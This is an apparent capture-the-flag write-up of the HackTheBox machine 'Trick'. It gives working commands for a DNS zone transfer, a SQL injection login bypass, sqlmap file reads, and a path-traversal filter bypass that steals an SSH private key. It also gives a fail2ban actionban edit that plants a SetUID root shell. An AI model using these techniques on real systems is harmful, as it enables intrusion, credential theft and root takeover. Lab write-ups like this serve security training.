### Service Discovery Analysis

The Nmap scan reveals four key services running on the target machine:

- **SSH (Port 22):** OpenSSH 7.9p1 on Debian 10 — standard SSH service
- **SMTP (Port 25):** Postfix mail server — couldn't fully establish connection but port is open; useful later for mail poisoning
- **DNS (Port 53):** ISC BIND 9.11.5 — a full authoritative DNS server on a Linux machine is unusual and immediately suggests a zone transfer attack
- **HTTP (Port 80):** nginx 1.14.2 hosting a "Coming Soon" Bootstrap template — minimal attack surface at first glance

**OS:** Linux (Debian 10) **Domain:** trick.htb

The most interesting findings here are the combination of **port 53 with ISC BIND** — a full DNS server, not just a resolver — and **port 25 with SMTP**. These two services together hint at the attack path: DNS zone transfer to discover hidden subdomains, and SMTP potentially useful for mail poisoning via LFI later. Port 80 shows just a placeholder site, so DNS enumeration is the priority.

We start by adding `trick.htb` to `/etc/hosts`:

```bash
echo "<target> trick.htb" | sudo tee -a /etc/hosts
```

## **User**

### DNS Zone Transfer

Port 80 shows a static "Coming Soon" page with nothing interesting. Since ISC BIND is running on port 53, we immediately attempt a DNS zone transfer. A zone transfer (`axfr`) requests a complete copy of all DNS records for a given zone from the name server. Misconfigured DNS servers allow this from any host, leaking the entire internal DNS structure:

```bash
dig axfr trick.htb @<target>
```

![](/assets/img/trick/Pasted_image_20260909001657.png)

The zone transfer succeeds and reveals a hidden subdomain: `preprod-payroll.trick.htb`. We add it to `/etc/hosts` and navigate to it.

### Overview - Employee's Payroll Management System (CVE-2022-28468)

**What is this application?** The `preprod-payroll.trick.htb` subdomain hosts a "Payroll Management System" — a real open-source PHP/MySQL application available on SourceCodeTester. It is designed for managing employee salaries, deductions, and attendance.

**Why is it vulnerable?** This application contains a well-known SQL injection vulnerability tracked as **CVE-2022-28468**. The login form constructs SQL queries by directly concatenating user input without sanitization or prepared statements. This allows authentication bypass and potentially file read via SQL injection.

### SQL Injection - Authentication Bypass (CVE-2022-28468)

Accessing `preprod-payroll.trick.htb` reveals a login panel:

![](/assets/img/trick/Pasted_image_20260909001931.png)

We test the classic SQL injection authentication bypass payload. The application constructs a query like `SELECT * FROM users WHERE username='[input]' AND password='[input]'`. By injecting `' or 1=1 --`, we close the username string, add a condition that's always true, and comment out the rest of the query — making the application believe we authenticated successfully:

```bash
' or 1=1 --
```

![](/assets/img/trick/Pasted_image_20260909002138.png)

The bypass works and we are now inside the Employee's Payroll Management System dashboard.

This allows us to extract data bit by bit:

### PHP Filter - Source Code Disclosure

The application also exposes a `page` parameter that includes PHP files. Using a **PHP filter wrapper** we can base64-encode the contents of any PHP file before it's rendered — preventing execution and returning the raw source code instead. This allows us to read the database connection configuration:

```bash
http://preprod-payroll.trick.htb/index.php?page=php://filter/convert.base64-encode/resource=db_connect
```

### SQLmap - File Read via SQL Injection

We capture the login request in Burp Suite and save it as `login.req`. Using SQLmap with the saved request, we leverage the SQL injection to read arbitrary files from the filesystem. The `--file-read` flag uses MySQL's `LOAD_FILE()` function to read files the database user has access to. The `--privilege` flag checks what database privileges are available:

```bash
sqlmap -r login.req --risk 3 --level 5 --technique=BEU --privilege --batch --file-read=/etc/passwd
```

Reading the extracted file:

```bash
cat /home/kali/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_passwd

root:x:0:0:root:/root:/bin/bash
michael:x:1001:1001::/home/michael:/bin/bash
```

Two users with shells are identified: `root` and `michael`.

### NGINX Configuration Discovery

We now use the same SQLmap file read to extract the NGINX virtual host configuration. This is the intended path to discover additional hidden subdomains — NGINX's config defines which domain names map to which web roots:

```bash
sqlmap -r login.req --risk 3 --level 5 --technique=BEU --privilege --file-read=/etc/nginx/sites-enabled/default
```

```bash
cat /home/kali/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_nginx_sites-enabled_default
```

![](/assets/img/trick/Pasted_image_20260909020517.png)

The NGINX configuration reveals a third virtual host: `preprod-marketing.trick.htb`. Notably, this site runs PHP through a different socket — `php7.3-fpm-michael.sock` — which hints that it executes as the `michael` user rather than `www-data`. We add this to `/etc/hosts` and navigate to it.

### LFI via Path Traversal - preprod-marketing

The marketing site uses a `page` parameter to include content files (`index.php?page=services.html`). The underlying PHP code prepends `/var/www/market/` to the input and uses `str_replace("../", "")` to block traversal — but this single-pass replacement is bypassable.

When `str_replace` removes `../` from `....//`, it leaves behind `../`. By doubling up the traversal sequence (`....//` instead of `../`), we bypass the filter. We use this to read Michael's private SSH key directly, avoiding the need for mail or log poisoning:

```bash
....//....//....//....//....//....//home/michael/.ssh/id_rsa
```

![](/assets/img/trick/Pasted_image_20260909021207.png)

Michael's private SSH key is returned in the page. Since the PHP socket for this site runs as michael, the web process has read access to files in his home directory.

### SSH Access as michael

We copy the extracted private key into a local file, set the correct permissions (SSH refuses keys readable by others), and authenticate:

```bash
chmod 600 id_rsa
ssh -i id_rsa michael@trick.htb
```

![](/assets/img/trick/Pasted_image_20260909021229.png)

A shell is established as michael. The user flag can now be retrieved.

### Overview - fail2ban Privilege Escalation

**What is fail2ban?** fail2ban is a Linux intrusion prevention tool that monitors log files for suspicious patterns (like repeated failed SSH logins) and automatically bans offending IP addresses, typically via `iptables` rules.

**How does fail2ban work?**

- A **filter** defines the log patterns to watch for
- An **action** defines what happens when a threshold is hit (the `actionban` command)
- A **jail** connects a filter to an action with configuration like `maxretry` and `bantime`

**Why is it exploitable here?** Michael is in the `security` group, which has write permissions on `/etc/fail2ban/action.d/` — the directory containing all action configuration files. The `actionban` command in these files runs with root privileges when fail2ban bans an IP. By modifying `actionban` to execute a malicious command, and then restarting fail2ban (which michael can do via sudo), any subsequent ban will execute our command as root.

### Abusing fail2ban

#### Step 1: Discover security Group Permissions

We use `find` to locate all files and directories accessible by the `security` group, sending errors to `/dev/null` to suppress permission denied messages:

```bash
find / -group security 2>/dev/null

# Found at:
/etc/fail2ban/action.d
```

The `security` group has full write access to `/etc/fail2ban/action.d/` — the directory containing all action configurations.

#### Step 2: Modify the actionban Command

We back up the original `iptables-multiport.conf` action file and create a modified copy with a malicious `actionban`. Instead of adding an `iptables` rule to block the IP, our payload copies `/bin/bash` to `/tmp/kali` and sets the SetUID bit (`4777`). SetUID on bash means it will run with the owner's privileges (root) when executed:

```bash
mv iptables-multiport.conf iptables-multiport.conf.bak
cp iptables-multiport.conf.bak iptables-multiport.conf
nano iptables-multiport.conf
```

Modify the `actionban` line to:

```bash
actionban = cp /bin/bash /tmp/kali; chmod 4777 /tmp/kali
```

![](/assets/img/trick/Pasted_image_20260909023010.png)

#### Step 3: Restart fail2ban

Restart fail2ban as root to load our modified action configuration:

```bash
sudo /etc/init.d/fail2ban restart
```

#### Step 4: Trigger a Ban

From our attacker machine, we use `netexec` to brute-force SSH with invalid credentials. After enough failed attempts (default `maxretry` is 5), fail2ban bans our IP — but instead of adding an `iptables` rule, it executes our malicious `actionban`, creating a SetUID bash binary:

```bash
nxc ssh trick.htb -u kali -p /usr/share/wordlists/rockyou.txt
```

#### Step 5: Execute SetUID Bash

Once the ban triggers and `/tmp/kali` is created, we execute it with the `-p` flag. The `-p` flag preserves the effective UID — without it, bash drops root privileges as a security measure. With `-p`, bash runs with its effective UID of root:

```bash
/tmp/kali -p
```

Full root access is achieved. The root flag can now be retrieved.

### Attack Chain Summary

1. **Reconnaissance:** Nmap identified ISC BIND 9.11.5 on port 53 and SMTP on port 25 — DNS zone transfer was the first priority
2. **DNS Zone Transfer:** Performed AXFR zone transfer revealing the hidden `preprod-payroll.trick.htb` subdomain
3. **SQL Injection (CVE-2022-28468):** Authenticated bypass on Employee Payroll Management System using `' or 1=1 --`; confirmed boolean-based blind injection
4. **PHP Filter Source Disclosure:** Used PHP filter wrapper to read `db_connect.php` source in base64, exposing MySQL credentials
5. **SQLmap File Read:** Used SQLmap with boolean-based blind injection to read `/etc/passwd` (identifying user michael) and NGINX config (revealing `preprod-marketing.trick.htb`)
6. **LFI via Path Traversal:** Exploited `str_replace` bypass in `preprod-marketing` to read michael's `/home/michael/.ssh/id_rsa` private key directly
7. **SSH Access:** Used extracted private key to authenticate as michael and retrieved user flag
8. **fail2ban Privilege Escalation:** Leveraged `security` group write access to `/etc/fail2ban/action.d/` to modify `actionban`, triggering a SetUID bash copy upon IP ban
9. **Root Access:** Triggered fail2ban ban via SSH brute-force with crackmapexec, executed `/tmp/kali -p` to get root shell and retrieved root flag
